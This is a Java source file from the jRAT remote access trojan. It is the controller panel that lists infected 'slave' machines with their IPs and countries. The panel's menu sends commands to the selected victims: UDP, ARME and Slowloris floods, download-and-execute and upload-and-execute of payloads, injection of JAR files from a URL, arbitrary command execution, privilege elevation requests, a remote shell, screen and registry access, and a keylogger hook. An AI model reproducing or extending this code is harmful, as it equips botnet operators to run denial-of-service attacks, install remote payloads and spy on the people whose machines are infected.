package se.jrat.client.ui.panels;

import java.awt.Color;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.ListSelectionModel;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import javax.swing.table.DefaultTableModel;

import com.redpois0n.graphs.utils.DataUnits;

import jrat.api.RATMenuItem;
import jrat.api.RATObject;
import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.Slave;
import se.jrat.client.Status;
import se.jrat.client.addons.Plugin;
import se.jrat.client.addons.PluginLoader;
import se.jrat.client.addons.RATObjectFormat;
import se.jrat.client.listeners.CountryMenuItemListener;
import se.jrat.client.net.URLParser;
import se.jrat.client.packets.outgoing.Packet100RequestElevation;
import se.jrat.client.packets.outgoing.Packet11Disconnect;
import se.jrat.client.packets.outgoing.Packet14VisitURL;
import se.jrat.client.packets.outgoing.Packet17DownloadExecute;
import se.jrat.client.packets.outgoing.Packet18Update;
import se.jrat.client.packets.outgoing.Packet22Flood;
import se.jrat.client.packets.outgoing.Packet36Uninstall;
import se.jrat.client.packets.outgoing.Packet37RestartJavaProcess;
import se.jrat.client.packets.outgoing.Packet38RunCommand;
import se.jrat.client.packets.outgoing.Packet45Reconnect;
import se.jrat.client.packets.outgoing.Packet98InjectJAR;
import se.jrat.client.settings.Settings;
import se.jrat.client.settings.SettingsColumns;
import se.jrat.client.ui.Columns;
import se.jrat.client.ui.components.DefaultJTable;
import se.jrat.client.ui.components.DefaultJTableCellRenderer;
import se.jrat.client.ui.dialogs.DialogFileType;
import se.jrat.client.ui.frames.FrameComputerInfo;
import se.jrat.client.ui.frames.FrameControlPanel;
import se.jrat.client.ui.frames.FrameNotes;
import se.jrat.client.ui.frames.FrameRemoteChat;
import se.jrat.client.ui.frames.FrameRemoteFiles;
import se.jrat.client.ui.frames.FrameRemoteProcess;
import se.jrat.client.ui.frames.FrameRemoteRegistry;
import se.jrat.client.ui.frames.FrameRemoteScreen;
import se.jrat.client.ui.frames.FrameRemoteShell;
import se.jrat.client.ui.frames.FrameRename;
import se.jrat.client.utils.IconUtils;
import se.jrat.client.utils.Utils;
import se.jrat.common.Flood;
import se.jrat.common.downloadable.Downloadable;

@SuppressWarnings("serial")
public class PanelMainClients extends JScrollPane {
	
	private final List<String> columns = new ArrayList<String>();

	private JTable table;
	private DefaultTableModel model;
	
	public PanelMainClients() {
		for (Columns s : Columns.values()) {
			if (SettingsColumns.getGlobal().isSelected(s.getName())) {
				columns.add(s.getName());
			}
		}
		
		model = new ClientsTableModel();
		table = new DefaultJTable(model);
		table.setDefaultRenderer(Object.class, new ClientsTableRenderer());
		table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
		
		table.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent e) {
				int row = table.getSelectedRow();
				int column = table.getSelectedColumn();

				if (row != -1 && table.getColumnName(column).equals(Columns.COUNTRY.getName())) {
					AbstractSlave sl = getSlave(row);
					sl.setSelected(!sl.isSelected());
					ListSelectionModel selectionModel = table.getSelectionModel();
					selectionModel.removeSelectionInterval(row, row);
				}
			}
		});
		
		resetRowHeight();
		
		Utils.addPopup(table, getPopupMenu());
		
		setViewportView(table);
	}
	
	public void reloadTable() {
		model = new ClientsTableModel();
		table.setModel(model);
		
		for (AbstractSlave slave : Main.connections) {
			model.addRow(new Object[] { slave });
		}
	}
	
	public void addSlave(AbstractSlave slave) {
		model.addRow(new Object[] { slave });
	}
	
	public void removeSlave(AbstractSlave slave) {
		for (int column = 0; column < table.getColumnCount(); column++) {
			for (int row = 0; row < table.getRowCount(); row++) {
				Object obj = table.getValueAt(row, column);
				
				if (obj.equals(slave)) {
					model.removeRow(row);
					return;
				}
			}
		}
	}

	public AbstractSlave getSlave(int row) {
		AbstractSlave slave = null;
		
		for (int i = 0; i < table.getColumnCount(); i++) {
			Object obj = table.getValueAt(row, i);
			if (obj instanceof AbstractSlave) {
				slave = (AbstractSlave) obj;
				break;
			}
		}
		
		return slave;
	}
	
	public List<AbstractSlave> getSelectedSlaves() {
		List<AbstractSlave> list = new ArrayList<AbstractSlave>();
		for (int i = 0; i < model.getRowCount(); i++) {
			AbstractSlave slave = getSlave(i);
			
			if (slave.isSelected() || table.isRowSelected(i)) {
				list.add(slave);
			}
		}
		return list;
	}
	
	public AbstractSlave getSelectedSlave() {
		int row = table.getSelectedRow();
		return getSlave(row);
	}
	
	public void setRowHeight(int i) {
		table.setRowHeight(i);
	}
	
	public void resetRowHeight() {
		int rowheight = 30;
		
		try {
			Object rowHeight = Settings.getGlobal().get("rowheight");
			if (rowHeight != null) {
				rowheight = Integer.parseInt(rowHeight.toString());
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		table.setRowHeight(rowheight);
	}
	
	public JTable getTable() {
		return table;
	}
	
	public List<String> getColumns() {
		return columns;
	}
	
	public class ClientsTableRenderer extends DefaultJTableCellRenderer {
		@Override
		public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
			JLabel label = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);

			AbstractSlave slave = getSlave(row);

			if (slave != null) {		
				String colname = table.getColumnName(column);
				
				label.setIcon(null);
				
				if (colname.equals(Columns.COUNTRY.getName()) && Main.instance.showThumbnails()) {
					label.setIcon(slave.getThumbnail());
				} else if (colname.equals(Columns.COUNTRY.getName())) {
					String path;

					String color = Integer.toHexString(label.getForeground().getRGB() & 0xffffff) + "";
					if (color.length() < 6) {
						color = "000000".substring(0, 6 - color.length()) + color;
					}
					
					String country = slave.getCountry();
								
					if (country != null) {
						path = "/flags/" + country.toLowerCase() + ".png";
					} else {
						path = "/flags/unknown.png";
					}
					
					JCheckBox b = new JCheckBox(country, slave.isSelected());

					b.setToolTipText(row + "");
					b.setBackground(label.getBackground());

					URL url = Main.class.getResource(path);

					if (url == null) {
						url = Main.class.getResource("/flags/unknown.png");
					}

					b.setText("<html><table cellpadding=0><tr><td><img src=\"" + url.toString() + "\"/></td><td width=3><td><font color=\"#" + color + "\">" + country + "</font></td></tr></table></html>");

					return b;
				} else if (colname.equals(Columns.ID.getName())) {
					String id;
					
					if (slave.getRenamedID() != null) {
						id = slave.getRenamedID();
					} else {
						id = slave.getID();
					}
					
					label.setText(id);
				} else if (colname.equals(Columns.STATUS.getName())) {
					label.setText(Status.getStatusFromID(slave.getStatus()));
				} else if (colname.equals(Columns.IP.getName())) {
					label.setText(slave.getIP());
				} else if (colname.equals(Columns.PING.getName())) {
					label.setIcon(IconUtils.getPingIcon(slave));
					label.setText(slave.getPing() + " ms");
				} else if (colname.equals(Columns.USER_HOST.getName())) {
					label.setText(slave.formatUserString());
				} else if (colname.equals(Columns.OPERATINGSYSTEM.getName())) {
					label.setIcon(IconUtils.getOSIcon(slave));
					label.setText(slave.getOperatingSystem().getDisplayString());
				} else if (colname.equals(Columns.RAM.getName())) {
					label.setText(DataUnits.getAsString(slave.getMemory()));
				} else if (colname.equals(Columns.LOCAL_ADDRESS.getName())) {
					label.setText(slave.getLocalIP());
				} else if (colname.equals(Columns.VERSION.getName())) {
					label.setText(slave.getVersion());
				} else if (colname.equals(Columns.AVAILABLE_CORES.getName())) {
					if (slave instanceof Slave) {
						label.setText(((Slave) slave).getCores() + "");
					} else {
						label.setText("?");
					}
				} else if (colname.equals(Columns.DESKTOP_ENVIRONMENT.getName())) {
					label.setText(slave.getOperatingSystem().getDesktopEnvironment().getDisplayString());
				}
			}

			return label;
		}
	}

	public class ClientsTableModel extends DefaultTableModel {

		public ClientsTableModel() {
			for (String s : columns) {
				super.addColumn(s);
			}
		}

		@Override
		public boolean isCellEditable(int i, int i1) {
			return false;
		}
	}
	
	public JPopupMenu getPopupMenu() {
		final JPopupMenu popupMenu = new JPopupMenu();
		
		JMenuItem mntmControlPanel = new JMenuItem("Control Panel                       ");
		mntmControlPanel.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameControlPanel screen = new FrameControlPanel((Slave) slave);
					screen.setVisible(true);
				}
			}
		});
		mntmControlPanel.setIcon(IconUtils.getIcon("controlpanel"));

		popupMenu.add(mntmControlPanel);
		popupMenu.addSeparator();

		JMenu mnNetworking = new JMenu("Networking");
		mnNetworking.setIcon(IconUtils.getIcon("process"));
		popupMenu.add(mnNetworking);

		JMenu mnStressing = new JMenu("Stressing");
		mnStressing.setIcon(IconUtils.getIcon("firewall"));
		mnNetworking.add(mnStressing);

		JMenuItem mntmUdpFlood = new JMenuItem("UDP");
		mnStressing.add(mntmUdpFlood);
		mntmUdpFlood.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("UDP flood", "Enter IP:Port to flood");
				if (target == null) {
					return;
				}
				try {
					String[] targetargs = target.split(":");
					Integer.parseInt(targetargs[1]);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				String time = Utils.showDialog("UDP flood", "Enter seconds to flood");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					for (AbstractSlave sl : servers) {
						if (sl instanceof Slave) {
							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.UDP, target, time1));
						}
					}
				}
			}
		});
		mntmUdpFlood.setIcon(null);

		JMenuItem mntmMassDownloadFlood = new JMenuItem("Mass download");
		mnStressing.add(mntmMassDownloadFlood);
		mntmMassDownloadFlood.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("Mass download flood", "Enter website URL to download");
				if (target == null) {
					return;
				}

				String time = Utils.showDialog("Mass download flood", "Enter seconds to download");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					for (AbstractSlave sl : servers) {
						if (sl instanceof Slave) {
							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.DRAIN, target, time1));
						}
					}
				}
			}
		});
		mntmMassDownloadFlood.setIcon(null);

		JMenuItem mntmArme = new JMenuItem("ARME");
		mnStressing.add(mntmArme);
		mntmArme.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("ARME flood", "Enter Host:Port/IP:Port to flood");
				if (target == null) {
					return;
				}
				try {
					String[] targetargs = target.split(":");
					Integer.parseInt(targetargs[1]);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				String time = Utils.showDialog("ARME flood", "Enter seconds to flood");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					for (AbstractSlave sl : servers) {
						if (sl instanceof Slave) {
							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.ARME, target, time1));
						}
					}
				}
			}
		});
		mntmArme.setIcon(null);

		JMenuItem mntmSlowloris = new JMenuItem("Slowloris");
		mntmSlowloris.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("Slowloris flood", "Enter Host:Port/IP:Port to flood");
				if (target == null) {
					return;
				}
				try {
					String[] targetargs = target.split(":");
					Integer.parseInt(targetargs[1]);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				String time = Utils.showDialog("Slowloris flood", "Enter seconds to flood");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					for (AbstractSlave sl : servers) {
						if (sl instanceof Slave) {
							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.SLOWLORIS, target, time1));
						}
					}
				}
			}
		});
		mnStressing.add(mntmSlowloris);

		mnNetworking.addSeparator();

		JMenuItem mntmexe = new JMenuItem("Download and Execute");
		mnNetworking.add(mntmexe);
		mntmexe.setIcon(IconUtils.getIcon("arrow-down"));

		JMenuItem mntmUploadAndExecute = new JMenuItem("Upload and Execute");
		mntmUploadAndExecute.setIcon(IconUtils.getIcon("drive-upload"));
		mntmUploadAndExecute.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					JFileChooser f = new JFileChooser();
					f.showOpenDialog(null);

					File file = f.getSelectedFile();

					if (file == null) {
						return;
					}

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet17DownloadExecute("", Downloadable.getFileExtension(file.getName()), file));
						}
					}
				}
			}
		});
		mnNetworking.add(mntmUploadAndExecute);

		mnNetworking.addSeparator();

		JMenuItem mntmUpdateFromUrl = new JMenuItem("Update from URL");
		mnNetworking.add(mntmUpdateFromUrl);
		mntmUpdateFromUrl.setIcon(IconUtils.getIcon("update"));

		JMenuItem mntmUpdateFromFile = new JMenuItem("Update from File");
		mntmUpdateFromFile.setIcon(IconUtils.getIcon("drive-upload"));
		mntmUpdateFromFile.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					JFileChooser f = new JFileChooser();
					f.showOpenDialog(null);

					File file = f.getSelectedFile();

					if (file == null) {
						return;
					}

					for (AbstractSlave slave : servers) {
						
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet18Update(file));
						}
					}
				}
			}
		});
		mnNetworking.add(mntmUpdateFromFile);

		mnNetworking.addSeparator();

		JMenuItem mntmHost = new JMenuItem("Host");
		mnNetworking.add(mntmHost);
		mntmHost.setIcon(IconUtils.getIcon("computer"));
		mntmHost.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null) {
					JOptionPane.showMessageDialog(null, slave.getHost(), "Host - " + slave.getIP(), JOptionPane.INFORMATION_MESSAGE);
				}
			}
		});
		mntmUpdateFromUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Update from URL", "Input URL to update with");
					if (result == null) {
						return;
					}
					try {
						URLParser.parse(result);
					} catch (Exception ex) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Update from URL", JOptionPane.ERROR_MESSAGE);
						return;
					}

					result = result.trim().replace(" ", "%20");

					for (AbstractSlave sl : servers) {
						if (sl instanceof Slave) {
							((Slave)sl).addToSendQueue(new Packet18Update(result));
						}
					}
				}
			}
		});
		mntmexe.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Download and Execute", "Input URL to download and execute");
					if (result == null) {
						return;
					}

					try {
						URLParser.parse(result);
					} catch (Exception ex) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
						return;
					}

					result = result.trim().replace(" ", "%20");

					String filetype = DialogFileType.showDialog();

					if (filetype == null) {
						return;
					}

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet17DownloadExecute(result, filetype));
						}
					}
				}
			}
		});

		JMenu mnQuickOpen = new JMenu("Quick Open");
		mnQuickOpen.setIcon(IconUtils.getIcon("application-import"));
		popupMenu.add(mnQuickOpen);

		JMenuItem mntmRemoteScreen = new JMenuItem("Remote Screen");
		mntmRemoteScreen.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteScreen.show((Slave) slave);
				}
			}
		});

		JMenuItem mntmVisitUrl = new JMenuItem("Visit URL");
		mnQuickOpen.add(mntmVisitUrl);
		mntmVisitUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Visit URL", "Input URL to visit");
					if (result != null && !result.startsWith("http://")) {
						result = "http://" + result;
					}
					if (result == null) {
						return;
					}

					if (!result.startsWith("http://")) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Visit URL", JOptionPane.ERROR_MESSAGE);
						return;
					}

					result = result.trim();

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet14VisitURL(result));
						}
					}
				}

			}
		});
		mntmVisitUrl.setIcon(IconUtils.getIcon("application-browser"));
		mntmRemoteScreen.setIcon(IconUtils.getIcon("screen"));
		mnQuickOpen.add(mntmRemoteScreen);

		JMenuItem mntmFileManager = new JMenuItem("File Manager");
		mntmFileManager.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteFiles frame = new FrameRemoteFiles((Slave) slave);
					frame.setVisible(true);
				}
			}
		});

		JMenuItem mntmRemoteRegistry = new JMenuItem("Remote Registry");
		mntmRemoteRegistry.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteRegistry frame = new FrameRemoteRegistry((Slave) slave);
					frame.setVisible(true);
				}
			}
		});
		mntmRemoteRegistry.setIcon(IconUtils.getIcon("registry"));
		mnQuickOpen.add(mntmRemoteRegistry);
		mntmFileManager.setIcon(IconUtils.getIcon("folder-go"));
		mnQuickOpen.add(mntmFileManager);

		JMenuItem mntmRemoteCmd = new JMenuItem("Remote Terminal");
		mntmRemoteCmd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteShell frame = new FrameRemoteShell((Slave) slave);
					frame.setVisible(true);
				}
			}
		});
		mntmRemoteCmd.setIcon(IconUtils.getIcon("terminal"));
		mnQuickOpen.add(mntmRemoteCmd);

		JMenuItem mntmRemoteChat = new JMenuItem("Remote Chat");
		mntmRemoteChat.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteChat frame = new FrameRemoteChat((Slave) slave);
					frame.setVisible(true);
				}
			}
		});

		JMenuItem mntmRemoteProcess = new JMenuItem("Remote Process");
		mntmRemoteProcess.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteProcess frame = new FrameRemoteProcess((Slave) slave);
					frame.setVisible(true);
				}
			}
		});
		mntmRemoteProcess.setIcon(IconUtils.getIcon("process-go"));
		mnQuickOpen.add(mntmRemoteProcess);
		mntmRemoteChat.setIcon(IconUtils.getIcon("chat"));
		mnQuickOpen.add(mntmRemoteChat);

		JMenuItem mntmNotes = new JMenuItem("Notes");
		mntmNotes.setIcon(IconUtils.getIcon("notes"));
		mntmNotes.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameNotes frame = new FrameNotes((Slave) slave);
					frame.setVisible(true);
				}
			}
		});
		mnQuickOpen.add(mntmNotes);
		
		JMenu mnTools_1 = new JMenu("Tools");
		mnTools_1.setIcon(IconUtils.getIcon("toolbox"));
		popupMenu.add(mnTools_1);
		
				JMenuItem mntmRunCommand = new JMenuItem("Run Command");
				mnTools_1.add(mntmRunCommand);
				mntmRunCommand.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent arg0) {
						List<AbstractSlave> servers = getSelectedSlaves();
						if (servers.size() > 0) {
							String process = Utils.showDialog("Run Command", "Select command to send to connections");
							if (process == null) {
								return;
							}

							for (AbstractSlave slave : servers) {
								if (slave instanceof Slave) {
									((Slave)slave).addToSendQueue(new Packet38RunCommand(process));
								}
							}
						}
					}
				});
				mntmRunCommand.setIcon(IconUtils.getIcon("execute"));

		JMenu mnInject = new JMenu("Inject JAR");
		mnTools_1.add(mnInject);
		mnInject.setIcon(IconUtils.getIcon("inject"));

		JMenuItem mntmInjectFromUrl = new JMenuItem("Inject from URL");
		mntmInjectFromUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String url;

					url = Utils.showDialog("Inject from URL", "Type file URL");

					if (url == null || url != null && url.length() == 0) {
						return;
					}

					String mainClass;

					mainClass = Utils.showDialog("Inject from URL", "Type the JAR file entry point class name");

					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
						return;
					}

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet98InjectJAR(url, mainClass));
						}
					}
				}
			}
		});
		mntmInjectFromUrl.setIcon(IconUtils.getIcon("arrow-down"));
		mnInject.add(mntmInjectFromUrl);

		JMenuItem mntmInjectFromFile = new JMenuItem("Inject from file");
		mntmInjectFromFile.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					JFileChooser f = new JFileChooser();
					f.showOpenDialog(null);

					File file = f.getSelectedFile();

					if (file == null) {
						return;
					}

					String mainClass;

					mainClass = Utils.showDialog("Inject from File", "Type the JAR file entry point class name");

					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
						return;
					}

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet98InjectJAR(file, mainClass));
						}
					}
				}
			}
		});
		mntmInjectFromFile.setIcon(IconUtils.getIcon("drive-upload"));
		mnInject.add(mntmInjectFromFile);
		
		JMenuItem mntmRequestElevation = new JMenuItem("Request Elevation");
		mntmRequestElevation.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();

				for (AbstractSlave slave : servers) {
					if (slave instanceof Slave) {
						((Slave)slave).addToSendQueue(new Packet100RequestElevation());
					}
				}
			}
		});
		mntmRequestElevation.setIcon(IconUtils.getIcon("shield"));
		mnTools_1.add(mntmRequestElevation);
		popupMenu.addSeparator();

		JMenuItem mntmInfo = new JMenuItem("Info");
		mntmInfo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameComputerInfo screen = new FrameComputerInfo((Slave) slave);
					screen.setVisible(true);
				}
			}
		});
		mntmInfo.setIcon(IconUtils.getIcon("info"));
		popupMenu.add(mntmInfo);

		JMenuItem mntmForceDisconnect = new JMenuItem("Disconnect");
		mntmForceDisconnect.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm disconnecting " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet11Disconnect());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		JMenuItem mntmRestart = new JMenuItem("Restart");
		mntmRestart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm restarting " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet37RestartJavaProcess());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		JMenuItem mntmRename = new JMenuItem("Rename");
		mntmRename.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null) {
					FrameRename screen = new FrameRename(slave);
					screen.setVisible(true);
				}
			}
		});
		mntmRename.setIcon(IconUtils.getIcon("rename"));
		popupMenu.add(mntmRename);
		popupMenu.addSeparator();
		mntmRestart.setIcon(IconUtils.getIcon("refresh"));
		popupMenu.add(mntmRestart);

		JMenuItem mntmRestartConnection = new JMenuItem("Reconnect");
		mntmRestartConnection.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm reconnect " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet45Reconnect());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});
		mntmRestartConnection.setIcon(IconUtils.getIcon("refresh-blue"));
		popupMenu.add(mntmRestartConnection);
		mntmForceDisconnect.setIcon(IconUtils.getIcon("delete"));
		popupMenu.add(mntmForceDisconnect);

		JMenuItem mntmUninstall = new JMenuItem("Uninstall");
		mntmUninstall.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm uninstalling " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet36Uninstall());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		mntmUninstall.setIcon(IconUtils.getIcon("exit"));
		popupMenu.add(mntmUninstall);
		
		popupMenu.addPopupMenuListener(new PopupMenuListener() {
			public void popupMenuCanceled(PopupMenuEvent arg0) {

			}

			public void popupMenuWillBecomeInvisible(PopupMenuEvent arg0) {
				try {
					for (int i = 0; i < popupMenu.getComponents().length; i++) {
						Component child = popupMenu.getComponents()[i];
						if (child instanceof JMenuItem) {
							JMenuItem item = (JMenuItem) child;
							if (item.getText().startsWith("Stub V: ")) {
								popupMenu.remove(child);
								popupMenu.remove(i - 1);
								popupMenu.remove(i - 2);
							} else if (item.getText().startsWith("Keylogger") || item.getText().equals("Offline logs")) {
								item.setEnabled(true);
								if (item.getText().startsWith("Keylogger")) {
									item.setText("Keylogger");
								}
							}
						}
					}
				} catch (Exception ex) {

				}
			}

			public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
				try {
					List<AbstractSlave> list = getSelectedSlaves();
					if (list.size() == 1) {
						JMenuItem item = new JMenuItem("Stub V: " + list.get(0).getVersion());
						JMenuItem item2 = new JMenuItem("Country: " + list.get(0).getCountry().toUpperCase());

						item2.addActionListener(new CountryMenuItemListener());

						item2.setIcon(list.get(0).getFlag());
						item.setForeground(list.get(0).isUpToDate() ? Color.black : Color.red);
						item.setIcon(list.get(0).isUpToDate() ? IconUtils.getIcon("enabled") : IconUtils.getIcon("warning"));

						popupMenu.addSeparator();
						popupMenu.add(item2);
						popupMenu.add(item);
					}

					repaint();
				} catch (Exception ex) {
					// ex.printStackTrace();
				}
			}
		});

		for (Plugin plugin : PluginLoader.plugins) {
			if (plugin.getItems() != null && plugin.getItems().size() > 0) {
				popupMenu.addSeparator();
				break;
			}
		}
		for (Plugin plugin : PluginLoader.plugins) {
			if (plugin.getItems() != null && plugin.getItems().size() > 0) {
				for (final RATMenuItem en : plugin.getItems()) {
					JMenuItem item = en.getItem();

					item.addActionListener(new ActionListener() {
						public void actionPerformed(ActionEvent e) {
							List<AbstractSlave> list = getSelectedSlaves();
							List<RATObject> servers = new ArrayList<RATObject>();
							for (int i = 0; i < list.size(); i++) {
								servers.add(RATObjectFormat.format(list.get(i)));
							}

							en.getListener().onClick(servers);
						}
					});
					
					popupMenu.add(item);
				}
			}
		}
		
		return popupMenu;
	}

}
